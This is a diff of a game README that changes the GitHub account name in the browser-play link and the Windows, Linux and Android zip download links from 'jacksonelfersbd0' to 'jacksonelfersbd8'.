@@ -5,20 +5,20 @@
 _Available for Windows, Linux, Android, and now playable in your browser!_  
 
 ## 🌐 Play in Your Browser  
-🎮 **[Play Now](https://jacksonelfersbd0.github.io/ab1/)** – No download required!  
+🎮 **[Play Now](https://jacksonelfersbd8.github.io/ab1/)** – No download required!  
 
 ---
 
 ## 🖥️ Desktop Versions  
 | Platform | Download |
 |----------|----------|
-| 🪟 **Windows** | [Download ab1.zip](https://github.com/jacksonelfersbd0/ab1/raw/refs/heads/master/windows/ab1.zip) |
-| 🐧 **Linux** | [Download ab1.zip](https://github.com/jacksonelfersbd0/ab1/raw/refs/heads/master/linux/ab1.zip) |
+| 🪟 **Windows** | [Download ab1.zip](https://github.com/jacksonelfersbd8/ab1/raw/refs/heads/master/windows/ab1.zip) |
+| 🐧 **Linux** | [Download ab1.zip](https://github.com/jacksonelfersbd8/ab1/raw/refs/heads/master/linux/ab1.zip) |
 
 ## 📱 Mobile Version  
 | Platform | Download |
 |----------|----------|
-| 🤖 **Android** | [Download ab1.zip](https://github.com/jacksonelfersbd0/ab1/raw/refs/heads/master/android/ab1.zip) |
+| 🤖 **Android** | [Download ab1.zip](https://github.com/jacksonelfersbd8/ab1/raw/refs/heads/master/android/ab1.zip) |
 
 ---
 
